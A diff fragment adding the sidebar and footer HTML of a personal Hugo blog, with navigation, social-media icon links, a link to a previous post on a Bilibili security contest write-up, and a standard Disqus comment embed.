+<li class="px-1 md:px-0">
+<a href=/tags/ title="Tags page">
+Tags
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/series/ title="Series page">
+Series
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/about/ title="About page">
+About
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/friends/ title="Friends page">
+Friends
+</a>
+</li>
+<div id=fastSearch class=m-0>
+<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
+placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
+<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
+</ul>
+</div>
+</ul>
+<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16">
+<a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg>
+</div>
+</a>
+<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
+</div>
+</a>
+<a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg>
+</div>
+</a>
+<a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg>
+</div>
+</a>
+<a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg>
+</div>
+</a>
+<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
+</div>
+</a>
+</div>
+<div class="text-sm text-gray-500 leading-tight a-gray">
+<br>
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 4607 words in this page.
+</div>
+</div>
+</div>
+</aside>
+<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
+<hr class=double-line>
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+<a class=flex-grow-0 href=/2021/11/14/bilibili-sec1024-wp/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
+Bilibili 1024安全攻防 Wp
+</a>
+</div>
+<div>
+</div>
+<hr>
+<div class=pb-2>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<hr>
+</footer>
+<script src=/dist/app.js></script>
+<script src=/lib/fuse.min.js></script>
+<script src=/lib/fastsearch.js></script>
+</div>
+</body>
+</html>
